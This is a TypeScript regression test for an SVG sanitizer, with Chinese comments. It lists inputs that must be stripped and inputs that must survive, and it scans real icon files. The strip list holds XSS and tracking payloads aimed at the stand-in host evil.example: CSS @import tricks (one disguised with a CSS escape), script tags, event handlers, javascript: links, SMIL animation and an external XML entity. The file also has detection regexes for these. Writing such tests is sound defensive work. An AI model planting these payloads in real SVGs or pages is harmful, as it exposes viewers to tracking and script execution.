/**
 * SVG 清洗回归测试。用法：pnpm test:svg
 *
 * 为什么需要这个文件：`sanitizeSvg()` 是基于正则的，正则的洞是「改了另一个地方才暴露」的。
 * 曾经就漏过一整类 —— 只拦 `url(...)`，没拦 `@import "https://…"`（不带 url() 的字符串写法），
 * 结果是任何打开这个 SVG 的人都会被浏览器带去请求第三方，把 IP / Referer / UA 送出去。
 *
 * 这里把「必须拦掉的」和「必须保留的」都钉死，以后动清洗逻辑先跑这个。
 */

import { readFileSync, readdirSync } from 'node:fs';
import path from 'node:path';

import { looksLikeSvg, sanitizeSvg } from '../src/lib/svg';

const FAILURES: string[] = [];

function check(label: string, passed: boolean, detail?: string): void {
  if (passed) {
    console.log(`  ✓ ${label}`);
    return;
  }
  FAILURES.push(`${label}${detail ? ` —— ${detail}` : ''}`);
  console.log(`  ✗ ${label}${detail ? ` —— ${detail}` : ''}`);
}

const HOST = 'evil.example';

/** 必须在清洗后彻底消失的东西 */
const MUST_STRIP: Array<[string, string]> = [
  // ── 修掉的那个洞：@import 的字符串写法 ──
  ['@import 双引号', `<style>@import "https://${HOST}/x.css";</style>`],
  ['@import 单引号', `<style>@import 'https://${HOST}/x.css';</style>`],
  ['@import 协议相对', `<style>@import "//${HOST}/x.css";</style>`],
  ['@import url() 形式', `<style>@import url(https://${HOST}/x.css);</style>`],
  ['@import 带 layer()', `<style>@import url("https://${HOST}/x.css") layer(base);</style>`],
  ['@import 藏在 CSS 注释里', `<style>/* @import "https://${HOST}/x.css"; */ .a{fill:red}</style>`],
  ['@import 用 CSS 转义伪装', `<style>@im\\70 ort "https://${HOST}/x.css";</style>`],
  ['@import 无结束分号', `<style>@import "https://${HOST}/x.css"</style>`],

  // ── 同类：不带 url() 的其它引外链写法 ──
  ['image-set 裸字符串', `<style>.a{background-image:image-set("https://${HOST}/x.png" 1x)}</style>`],
  ['@namespace', `<style>@namespace svg url(https://${HOST}/ns);</style>`],

  // ── url() 写法（旧版就能拦，防回归）──
  ['<style> 里的 url()', `<style>.a{fill:url(https://${HOST}/x.svg#g)}</style>`],
  ['style 属性里的 url()', `<circle style="fill:url(https://${HOST}/x.svg#g)" r="4"/>`],
  ['元素属性里的 url()', `<rect fill="url(https://${HOST}/x.svg#g)"/>`],

  // ── 执行能力 ──
  ['<script> 成对', `<script>alert(1)</script>`],
  ['<script> 自闭合', `<script src="https://${HOST}/x.js"/>`],
  ['onload 事件属性', `<svg onload="alert(1)">`],
  ['onclick 事件属性', `<circle onclick='alert(1)'/>`],
  ['foreignObject', `<foreignObject><body xmlns="http://www.w3.org/1999/xhtml">x</body></foreignObject>`],
  ['<iframe>', `<iframe src="https://${HOST}/"></iframe>`],
  ['SMIL <set>', `<set attributeName="href" to="javascript:alert(1)"/>`],
  ['SMIL <animate>', `<animate attributeName="href" values="javascript:alert(1)"/>`],

  // ── 其它外链载体 ──
  ['href 外链', `<image href="https://${HOST}/x.png"/>`],
  ['xlink:href 外链', `<image xlink:href="https://${HOST}/x.png"/>`],
  ['javascript: 协议', `<a href="javascript:alert(1)">x</a>`],
  ['DOCTYPE + ENTITY', `<!DOCTYPE svg [<!ENTITY x SYSTEM "https://${HOST}/x">]><svg>&x;</svg>`],
];

/** 清洗后必须原样活着的东西（过度清洗 = 把正常图标洗坏） */
const MUST_KEEP: Array<[string, string, string]> = [
  ['@media 保留', `<style>@media (prefers-color-scheme:dark){.a{fill:#fff}}</style>`, '@media'],
  ['@keyframes 保留', `<style>@keyframes s{from{opacity:0}to{opacity:1}}</style>`, '@keyframes'],
  ['普通样式保留', `<style>.cls-1{fill:#2F6B6B;stroke-width:2}</style>`, 'stroke-width:2'],
  ['内部渐变引用保留', `<linearGradient id="g"/><rect fill="url(#g)"/>`, 'url(#g)'],
  ['内部 href 保留', `<use href="#icon-shape"/>`, 'href="#icon-shape"'],
  ['data:image 保留', `<image href="data:image/png;base64,iVBORw0KGgo="/>`, 'data:image/png'],
  ['xmlns 保留', `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">`, 'http://www.w3.org/2000/svg'],
  ['style 属性里的合法声明保留', `<circle style="fill:#fff;opacity:.5"/>`, 'opacity:.5'],
];

function wrap(inner: string): string {
  return inner.trimStart().startsWith('<svg') ? inner : `<svg xmlns="http://www.w3.org/2000/svg">${inner}</svg>`;
}

function main(): void {
  console.log('\n【一】必须被清洗掉\n');
  for (const [label, payload] of MUST_STRIP) {
    const out = sanitizeSvg(wrap(payload)).svg;
    const leaked = out.includes(HOST);
    const stillRisky =
      /<script|<iframe|<foreignObject|<animate|<set\b/i.test(out) ||
      /\son[a-z]+\s*=/i.test(out) ||
      /@(import|namespace|charset)\b/i.test(out) ||
      /javascript:/i.test(out);
    check(label, !leaked && !stillRisky, leaked ? `仍含 ${HOST}` : stillRisky ? '仍含危险构造' : undefined);
  }

  console.log('\n【二】必须保留（别把正常图标洗坏）\n');
  for (const [label, payload, needle] of MUST_KEEP) {
    const out = sanitizeSvg(wrap(payload)).svg;
    check(label, out.includes(needle), `输出里找不到 ${needle}`);
  }

  console.log('\n【三】cleaned 标志位如实反映有没有改动\n');
  {
    const dirty = sanitizeSvg(`<svg xmlns="http://www.w3.org/2000/svg"><script>x</script></svg>`);
    check('洗掉东西时 cleaned=true', dirty.cleaned === true);

    const clean = sanitizeSvg(
      `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" fill="#2F6B6B"/></svg>`,
    );
    check('干净文件 cleaned=false', clean.cleaned === false);
  }

  console.log('\n【四】looksLikeSvg 不把 HTML 误判成 SVG\n');
  {
    check('正常 SVG 判定为真', looksLikeSvg(`<svg xmlns="http://www.w3.org/2000/svg"></svg>`) === true);
    check(
      '带 XML 声明与 BOM 的 SVG 判定为真',
      looksLikeSvg(`\uFEFF<?xml version="1.0"?>\n<!-- c -->\n<svg xmlns="http://www.w3.org/2000/svg"/>`) === true,
    );
    check(
      'SPA 的 index.html 判定为假',
      looksLikeSvg(`<!DOCTYPE html><html><body><svg viewBox="0 0 1 1"></svg></body></html>`) === false,
    );
  }

  console.log('\n【五】仓库里已有的真实图标洗一遍仍然可用\n');
  {
    const iconsDir = path.resolve(process.cwd(), 'data/uploads/public/icons');
    let scanned = 0;
    let broken = 0;
    let leakedFiles: string[] = [];

    let names: string[] = [];
    try {
      names = readdirSync(iconsDir).filter((f) => f.toLowerCase().endsWith('.svg'));
    } catch {
      console.log('  （data/uploads/public/icons 不存在，跳过 —— 部署时 data/ 不随代码走，属正常）');
    }

    for (const name of names) {
      scanned += 1;
      const raw = readFileSync(path.join(iconsDir, name), 'utf8');
      const out = sanitizeSvg(raw).svg;
      if (!looksLikeSvg(out) || out.length < 40) {
        broken += 1;
        console.log(`      ✗ ${name} 洗完之后不成形`);
      }
      if (/https?:\/\/(?!www\.w3\.org)/i.test(out.replace(/xmlns(:\w+)?="[^"]*"/gi, ''))) {
        leakedFiles.push(name);
      }
    }

    if (scanned === 0) {
      console.log('  （没有 .svg 图标可供检查）');
    } else {
      check(`${scanned} 个真实图标洗完后仍是合法 SVG`, broken === 0, `${broken} 个被洗坏`);
      check('真实图标里没有残留外链', leakedFiles.length === 0, leakedFiles.join(', '));
    }
  }

  console.log('');
  if (FAILURES.length > 0) {
    console.log(`❌ SVG 清洗测试失败 ${FAILURES.length} 项：`);
    for (const f of FAILURES) console.log(`   - ${f}`);
    process.exit(1);
  }
  console.log('✅ SVG 清洗测试全部通过');
}

main();
